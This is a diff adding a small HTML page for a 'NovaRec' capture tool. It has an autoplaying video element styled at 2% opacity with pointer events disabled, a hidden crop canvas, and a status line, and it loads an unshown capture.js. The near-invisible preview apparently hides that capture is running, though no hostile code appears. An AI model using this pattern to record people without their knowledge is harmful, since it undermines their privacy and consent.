@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>NovaRec 采集器</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #9aa4b2; font: 12px/1.6 "Segoe UI", "Microsoft YaHei", sans-serif; overflow: hidden; }
+  #preview { position: fixed; left: 0; top: 0; width: 320px; height: 180px; opacity: 0.02; pointer-events: none; }
+  #crop { display: none; }
+  #status { position: fixed; left: 10px; bottom: 8px; white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<video id="preview" muted playsinline autoplay></video>
+<canvas id="crop"></canvas>
+<div id="status">采集器就绪</div>
+<script src="capture.js"></script>
+</body>
+</html>
